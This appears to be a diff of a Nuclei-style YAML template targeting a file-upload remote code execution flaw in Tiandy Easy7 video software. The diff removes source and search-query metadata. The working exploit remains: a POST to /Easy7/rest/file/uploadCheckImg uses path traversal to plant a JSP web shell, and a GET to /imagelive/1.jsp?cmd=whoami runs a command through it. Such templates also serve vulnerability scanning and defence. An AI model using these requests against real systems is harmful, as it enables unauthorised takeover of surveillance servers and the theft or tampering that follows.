@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7 uploadCheckImg 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sbgtm0afzaavdu0c'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sbgtm0afzaavdu0c
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'POST /Easy7/rest/file/uploadCheckImg?fileName=1.jsp&uploadPicturePath=/../../root/tiandy/data/ HTTP/1.1
@@ -38,9 +34,6 @@ http:
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831004079-4f9b8d63-1d82-415c-9b58-c7394bcc62ca.png)
-
-
     验证url'
   redirects: false
   matchers:
@@ -50,10 +43,7 @@ http:
 - raw:
   - 'GET /imagelive/1.jsp?cmd=whoami HTTP/1.1
 
-    Host: {{Hostname}}
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831004293-d6e2f434-35f3-4bc8-973a-93187b37e2a9.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
